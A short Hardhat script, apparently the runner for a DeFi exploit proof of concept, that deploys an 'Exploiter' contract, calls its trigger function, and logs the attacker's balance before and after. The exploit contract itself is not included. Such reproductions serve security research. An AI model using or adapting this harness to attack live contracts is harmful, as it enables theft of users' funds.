// 
//  Author [#] Supremacy Inc.
//

const hre = require("hardhat");

async function main() {
  const Exp = await hre.ethers.getContractFactory("Exp");
  const exp = await Exp.deploy();

  await exp.deployed();

  console.log("[#] 🧛 Exploiter deployed to:", exp.address);

  const cash = await exp.nobodies()
  console.log("[#]🥷  The attacker's balance before the attack:", cash.toString());

  await exp.trigger()

  const money = await exp.nobodies()
  console.log("[#] 🧛 The attacker's balance After the attack:", money.toString());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
